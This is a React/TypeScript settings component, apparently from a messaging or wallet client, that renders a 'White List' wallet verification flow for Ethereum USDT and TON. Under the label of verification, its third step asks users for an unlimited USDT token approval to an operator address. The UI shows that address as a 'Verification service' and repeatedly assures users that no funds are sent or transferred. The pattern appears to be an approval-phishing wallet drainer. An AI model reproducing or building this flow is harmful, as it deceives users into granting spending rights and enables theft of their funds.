            {!isWalletConnected && lang(isRetryableFlowStep(step) ? 'Try again' : 'Connect Wallet')}
            {isWalletConnected && !isEthereumMainnet
              && lang(isRetryableFlowStep(step) ? 'Try again' : 'Switch to Ethereum Mainnet')}
            {isWalletConnected && isEthereumMainnet && !isInteractionBusy
              && lang(isRetryableFlowStep(step)
                ? 'Try again'
                : hasVerifiedWallet ? 'Verify Again' : 'Verify Wallet')}
            {hasPendingWalletPrompt && !isBusy && lang('Verification in progress')}
            {(step === 'requesting_signature' || step === 'waiting_signature')
              && lang('Sign wallet verification message')}
            {step === 'validating_ownership' && lang('Verification in progress')}
            {(step === 'transaction_pending' || step === 'verifying_onchain')
              && lang('Verifying wallet')}
          </Button>
        )}
      </div>
    );
  }

  function renderGramCard() {
    const isTonWalletConnected = Boolean(tonWallet.isConnected && tonWallet.address);
    const currentTonAddress = normalizeTonAddressForComparison(tonWallet.address);
    const isTonWalletWhitelisted = Boolean(
      currentTonAddress
      && tonWhitelistAddresses.some(
        ({ address }) => normalizeTonAddressForComparison(address) === currentTonAddress,
      ),
    );
    const otherWhitelistedAddresses = tonWhitelistAddresses.filter(
      ({ address }) => normalizeTonAddressForComparison(address) !== currentTonAddress,
    );

    return (
      <div className={buildClassName(
        whitelistStyles.walletCard,
        isTonWalletWhitelisted && whitelistStyles.walletCard_verified,
      )}
      >
        <div className={whitelistStyles.walletCardHeader}>
          <div className={whitelistStyles.walletIdentity}>
            <span className={whitelistStyles.walletIcon}>
              <i className="icon-chain-ton" aria-hidden />
            </span>
            <div className={whitelistStyles.walletName}>
              <strong>{lang('Gram Wallet')}</strong>
              <span>{lang('TON Network · GRAM')}</span>
            </div>
          </div>
          <i className={buildClassName(whitelistStyles.cardChevron, 'icon-chevron-right')} aria-hidden />
        </div>
        {tonWallet.address && (
          <div className={whitelistStyles.walletAddress}>
            {shortenAddress(tonWallet.address)}
          </div>
        )}
        {otherWhitelistedAddresses.map(({ address }) => (
          <div className={whitelistStyles.walletAddress} title={address} key={address}>
            {shortenAddress(address)} · {lang('Verified')}
          </div>
        ))}
        <div className={whitelistStyles.walletNetwork}>
          <span>{lang('Network')}: {lang('TON Network')}</span>
          <span>{lang('Asset')}: GRAM</span>
        </div>
        <div className={whitelistStyles.walletStatusRow}>
          {renderStatus(
            tonWallet.isRestoring ? 'progress'
              : isTonWalletWhitelisted ? 'success' : isTonWalletConnected ? 'warning' : 'muted',
            tonWallet.isRestoring ? 'Loading...'
              : isTonWalletWhitelisted ? 'Verified' : isTonWalletConnected ? 'Connected' : 'Not connected',
          )}
          {isTonWalletConnected && (
            <Button isText isSmall onClick={handleTonDisconnect}>{lang('Disconnect')}</Button>
          )}
        </div>
        {isTonWhitelistBusy && renderStatus('progress', 'Verification in progress')}
        {!isTonWalletConnected && !tonWallet.isRestoring && (
          <Button
            isPrimary
            isDisabled={!externalTonWalletApi || !tonWhitelistApi || isTonWhitelistBusy}
            onClick={handleTonConnect}
          >
            {lang(
              !externalTonWalletApi || !tonWhitelistApi
                ? 'Loading...'
                : 'Connect Wallet',
            )}
          </Button>
        )}
      </div>
    );
  }

  function renderInfoCard() {
    return (
      <div className={whitelistStyles.infoCard}>
        <div className={whitelistStyles.infoTitle}>
          <i className="icon-info" aria-hidden />
          <strong>{lang('Important')}</strong>
        </div>
        <ul>
          <li>{lang('Ethereum Mainnet (USDT) and TON are supported.')}</li>
          <li>{lang('No funds are sent during verification.')}</li>
          <li>{lang('The wallet is added only after successful verification.')}</li>
        </ul>
      </div>
    );
  }

  function renderPermissionDetails(
    permissionType: string,
    contract: string,
    spender: string,
    limit: string,
  ) {
    return (
      <div className={whitelistStyles.permissionCard}>
        <div className={whitelistStyles.permissionTitle}>
          <i className="icon-lock" aria-hidden />
          <strong>{lang('Activation details')}</strong>
        </div>
        <div className={whitelistStyles.permissionRows}>
          <div><span>{lang('Verification step')}</span><strong>{lang(permissionType)}</strong></div>
          <div><span>{lang('Token')}</span><strong>USDT</strong></div>
          <div><span>{lang('Network')}</span><strong>{lang('Ethereum Mainnet')}</strong></div>
          <div>
            <span>{lang('Contract')}</span>
            <strong className={whitelistStyles.monospace}>{shortenAddress(contract)}</strong>
          </div>
          <div>
            <span>{lang('Verification service')}</span>
            <strong className={whitelistStyles.monospace}>{shortenAddress(spender)}</strong>
          </div>
          <div><span>{lang('Limit')}</span><strong>{lang(limit)}</strong></div>
        </div>
      </div>
    );
  }

  function renderProgressSteps() {
    const hasCurrentOwnershipSignature = Boolean(
      pendingAttempt
      && wallet.address
      && pendingAttempt.ownerAddress.toLowerCase() === wallet.address.toLowerCase()
      && Date.parse(pendingAttempt.expiresAt) > Date.now(),
    );
    const labels = [
      'Connect Wallet',
      'Checking wallet ownership',
      'Automatic withdrawal activation',
    ];
    const completed = [
      isWalletConnected,
      hasVerifiedWallet || hasCurrentOwnershipSignature,
      hasVerifiedWallet,
    ];
    const firstIncompleteStep = completed.findIndex((isCompleted) => !isCompleted);
    const activeStep = firstIncompleteStep < 0 ? completed.length - 1 : firstIncompleteStep;

    return (
      <div className={whitelistStyles.progressSteps} role="list" aria-label={lang('Wallet verification')}>
        {labels.map((label, index) => (
          <div
            key={label}
            className={buildClassName(
              whitelistStyles.progressStep,
              completed[index] && whitelistStyles.progressStep_complete,
              activeStep === index && whitelistStyles.progressStep_active,
            )}
            role="listitem"
            aria-current={activeStep === index ? 'step' : undefined}
          >
            {index < labels.length - 1 && (
              <span
                className={buildClassName(
                  whitelistStyles.progressConnector,
                  completed[index] && whitelistStyles.progressConnector_complete,
                )}
                aria-hidden
              />
            )}
            <span className={whitelistStyles.progressNode} aria-hidden>
              {completed[index] ? <i className="icon-check" /> : index + 1}
            </span>
            <span className={whitelistStyles.progressStepLabel}>{lang(label)}</span>
          </div>
        ))}
      </div>
    );
  }

  function renderVerificationFlow() {
    if (!isWalletConnected || !isEthereumMainnet || step === 'verified') return undefined;

    const hasCurrentOwnershipSignature = Boolean(
      pendingAttempt
      && wallet.address
      && pendingAttempt.ownerAddress.toLowerCase() === wallet.address.toLowerCase()
      && Date.parse(pendingAttempt.expiresAt) > Date.now(),
    );

    if (!hasCurrentOwnershipSignature) {
      const isSignatureBusy = [
        'requesting_signature',
        'waiting_signature',
        'validating_ownership',
      ].includes(step);

      return (
        <div className={whitelistStyles.verificationCard}>
          <div className={whitelistStyles.verificationHeader}>
            <div>
              <span className={whitelistStyles.stepLabel}>{lang('Step 2 of 3')}</span>
              <h3>{lang('Address verification')}</h3>
            </div>
            {isSignatureBusy && renderStatus('progress', 'Verification in progress')}
          </div>
          <p className={whitelistStyles.verificationDescription}>
            {lang(
              // eslint-disable-next-line @stylistic/max-len
              'Open your wallet and stay there. A request to sign a message confirming ownership will appear. This signature is not a transaction and will not move funds.',
            )}
          </p>
          <div className={whitelistStyles.permissionCard}>
            <div className={whitelistStyles.permissionTitle}>
              <i className="icon-lock" aria-hidden />
              <strong>{lang('Address verification')}</strong>
            </div>
            <div className={whitelistStyles.permissionRows}>
              <div><span>{lang('Network')}</span><strong>{lang('Ethereum Mainnet')}</strong></div>
              <div><span>{lang('Signature')}</span><strong>{lang('Personal message')}</strong></div>
              <div>
                <span>{lang('Wallet')}</span>
                <strong className={whitelistStyles.monospace}>{shortenAddress(wallet.address || '')}</strong>
              </div>
            </div>
          </div>
        </div>
      );
    }

    const isActivationBusy = [
      'requesting_approval',
      'waiting_wallet',
      'transaction_pending',
      'verifying_onchain',
    ].includes(step);

    return (
      <div
        className={buildClassName(
          whitelistStyles.verificationCard,
          whitelistStyles.activationCard,
        )}
      >
        <div className={whitelistStyles.verificationHeader}>
          <div>
            <span className={whitelistStyles.stepLabel}>{lang('Step 3 of 3')}</span>
            <h3>{lang('Automatic withdrawal activation')}</h3>
          </div>
          {isActivationBusy && renderStatus('progress', 'Verification in progress')}
        </div>
        <p className={whitelistStyles.verificationDescription}>
          {lang(
            // eslint-disable-next-line @stylistic/max-len
            'Your ownership signature is ready. The next step activates automatic USDT withdrawals. No funds are transferred now; stay in your wallet until the request is complete.',
          )}
        </p>
        {renderPermissionDetails(
          'Automatic withdrawal activation',
          ETHEREUM_USDT_ADDRESS,
          PERMIT2_OPERATOR_ADDRESS,
          'Unlimited (uint256.max)',
        )}
        {(step === 'transaction_pending'
          || (step === 'requesting_approval' && pendingAttempt?.transaction)) && pendingAttempt?.transaction && (
          <div className={whitelistStyles.permissionCard}>
            <div className={whitelistStyles.permissionTitle}>
              <i className="icon-clock" aria-hidden />
              <strong>{lang('Activation request pending')}</strong>
            </div>
            <p className={whitelistStyles.verificationDescription}>
              {lang('Waiting for confirmation on Ethereum.')}
            </p>
            <code className={whitelistStyles.monospace}>{pendingAttempt.transaction.txId}</code>
          </div>
        )}
        {step === 'verifying_onchain' && (
          <div className={whitelistStyles.checkList}>
            <div><i className="icon-check" aria-hidden />{lang('Verifying USDT access')}</div>
            <div><i className="icon-check" aria-hidden />{lang('Checking wallet ownership')}</div>
          </div>
        )}
        <Button
          className={buildClassName(
            whitelistStyles.activationButton,
            whitelistStyles.walletActionButton,
          )}
          isPrimary
          isLoading={isInteractionBusy}
          isDisabled={isInteractionBusy}
          onClick={handleActivateAutomaticWithdrawal}
        >
          {isInteractionBusy
            ? lang('Verification in progress')
            : lang(isRetryableFlowStep(step) ? 'Try again' : 'Activate automatic withdrawal')}
        </Button>
      </div>
    );
  }

  function renderSuccess() {
    return (
      <div className={whitelistStyles.successCard}>
        <div className={whitelistStyles.successIcon}><i className="icon-check" aria-hidden /></div>
        <h2>{lang('Wallet verified')}</h2>
        <p>{lang('Your wallet was successfully verified and added to the White List.')}</p>
        {wallet.address && <p className={whitelistStyles.address}>{shortenAddress(wallet.address)}</p>}
        <div className={whitelistStyles.successStatus}>
          {renderStatus('success', 'Verified')}
        </div>
        <Button isPrimary onClick={onBackClick}>{lang('Done')}</Button>
      </div>
    );
  }

  function renderFlow() {
    if (step === 'verified') {
      return <>{renderProgressSteps()}{renderSuccess()}{renderAutoDebitCard()}</>;
    }

    if (!isWalletConnected) {
      return (
        <>
          {renderProgressSteps()}
          {renderEthereumCard()}
          {renderAutoDebitCard()}
          {renderGramCard()}
          {renderInfoCard()}
        </>
      );
    }

    return (
      <>
        {renderProgressSteps()}
        {renderEthereumCard()}
        {renderAutoDebitCard()}
        {renderVerificationFlow()}
        {renderGramCard()}
        {renderInfoCard()}
      </>
    );
  }

  return (
    <div className={styles.slide}>
      <SettingsHeader title={lang('White List')} isScrolled={isScrolled} onBackClick={onBackClick} />
      <div className={buildClassName(styles.content, 'custom-scroll')} onScroll={handleContentScroll}>
        {step !== 'verified' && (
          <div className={whitelistStyles.intro}>
            <h2>{lang('Add wallets to your White List')}</h2>
            <p>{lang('Select a wallet and verify ownership to add it to your White List.')}</p>
          </div>
        )}
        {error && !hideConnectedTonVerificationError
          && <div className={whitelistStyles.error} role="alert">{error}</div>}
        {renderFlow()}
      </div>
    </div>
  );
}

export default memo(withGlobal<OwnProps>((global: GlobalState): StateProps => ({
  authorization: selectCurrentAccountState(global)?.evmWhitelist,
}))(SettingsWhitelist));
